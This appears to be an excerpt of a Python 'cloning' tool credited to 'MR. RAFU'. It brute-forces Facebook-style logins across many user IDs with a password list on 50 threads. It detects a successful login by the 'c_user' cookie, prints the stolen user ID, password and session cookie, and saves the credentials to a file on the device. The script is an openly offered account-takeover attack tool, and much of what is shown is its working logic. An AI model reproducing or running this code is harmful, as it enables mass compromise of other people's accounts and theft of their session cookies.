...
|___|___||__|\_||__|    |__|\_||__|__||__|  \__,_| 
    ...
    └───────────────────────────────────────┘
\033[0;90m╠══[Author:=======================> \33[1;38mMR. RAFU✅\33[1;38m       ║\033[1;31m
...
def xxr():
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;90m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;90m '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;90m USE YOUR MOBILE DATA ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAFU-CP😭] \033[0;90m'+uid+'\033[1;32m | \033[0;90m' +ps+    '  \n[‎‎🌺]\033[0;90m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;90m')
                open('/sdcard/RAFU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
